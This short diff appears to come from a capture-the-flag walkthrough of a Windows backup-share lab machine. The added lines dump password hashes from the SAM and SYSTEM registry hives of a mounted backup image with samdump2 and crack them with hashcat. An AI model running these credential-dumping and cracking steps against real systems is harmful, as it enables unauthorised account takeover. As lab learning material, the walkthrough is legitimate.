@@ -292,6 +292,11 @@ sudo mkdir /mnt/bastion
 sudo mount -t cifs -o username=NULL //<target ip>/Backups/WindowsImageBackup  /mnt/bastion -o rw
 mkdir /tmp/vhd
 guestmount --add "/mnt/bastion/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /tmp/vhd -v
+cd /tmp/vhd/Windows/System32/config/
+# using two file SYSTEM and SAM to dump the hashes
+samdump2 SYSTEM SAM > /tmp/hashes.txt
+# crack user password hash
+hashcat -m 1000 user_hash.txt <password_list.txt>
 ```
 
 
